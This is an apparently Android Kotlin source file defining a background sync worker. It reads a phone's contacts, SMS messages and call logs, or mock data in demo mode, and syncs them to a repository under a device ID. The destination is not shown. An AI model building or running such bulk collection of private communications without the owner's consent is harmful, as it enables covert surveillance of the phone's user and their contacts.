package com.boxx.datasync.sync

import android.content.Context
import android.os.Build
import androidx.hilt.work.HiltWorker
import androidx.preference.PreferenceManager
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.boxx.datasync.data.MockDataGenerator
import com.boxx.datasync.domain.model.Device
import com.boxx.datasync.domain.repository.DataRepository
import com.boxx.datasync.utils.DataHelper
import com.boxx.datasync.utils.DeviceIdHelper
import dagger.assisted.Assisted
import dagger.assisted.AssistedInject

@HiltWorker
class SyncWorker @AssistedInject constructor(
    @Assisted context: Context,
    @Assisted params: WorkerParameters,
    private val repository: DataRepository
) : CoroutineWorker(context, params) {

    override suspend fun doWork(): Result {
        val deviceId = DeviceIdHelper.getDeviceId(applicationContext)
        val prefs = PreferenceManager.getDefaultSharedPreferences(applicationContext)
        val isDemoMode = prefs.getBoolean("demo_mode", false)

        return try {
            val contacts = if (isDemoMode) {
                MockDataGenerator.generateMockContacts()
            } else {
                DataHelper.fetchContacts(applicationContext)
            }

            val smsList = if (isDemoMode) {
                MockDataGenerator.generateMockSMS()
            } else {
                DataHelper.fetchSMS(applicationContext)
            }

            val callLogs = if (isDemoMode) {
                MockDataGenerator.generateMockCallLogs()
            } else {
                DataHelper.fetchCallLogs(applicationContext)
            }

            repository.syncContacts(deviceId, contacts)
            repository.syncSMS(deviceId, smsList)
            repository.syncCallLogs(deviceId, callLogs)

            repository.updateDeviceInfo(Device(
                deviceName = Build.MODEL,
                deviceId = deviceId,
                lastSyncTime = System.currentTimeMillis(),
                contactCount = contacts.size,
                smsCount = smsList.size,
                callLogCount = callLogs.size,
                timestamp = System.currentTimeMillis(),
                isDemoMode = isDemoMode
            ))
            Result.success()
        } catch (e: Exception) {
            Result.retry()
        }
    }
}
